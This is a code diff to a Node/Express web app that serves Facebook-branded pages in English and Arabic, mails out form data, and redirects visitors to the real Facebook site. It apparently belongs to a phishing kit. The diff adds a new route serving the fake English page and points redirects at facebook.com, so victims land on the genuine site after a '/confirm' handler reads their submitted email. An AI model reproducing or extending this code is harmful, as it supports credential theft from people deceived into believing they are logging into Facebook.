@@ -36,7 +36,7 @@ var mailOptions = {
 
 
 // #####################################################################################################################################################
-var redirect_link='https://www.google.com'
+var redirect_link='https://www.fb.com'
 
 app.get('/', function (req, res) {
     res.render('fb_en', { redirect_link: redirect_link });
@@ -62,7 +62,11 @@ app.get('/ar/*', function (req, res) {
     res.render('fb_ar',{redirect_link:redirect_link});
 
 })
-
+app.get('/s/*', function (req, res) {
+    redirect_link ='https://www.facebook.com/'
+    res.render('fb_en',{redirect_link:redirect_link});
+    
+})
 // #####################################################################################################################################################
 app.post('/confirm', function (req, res) {
     var mail = req.body.email_a;
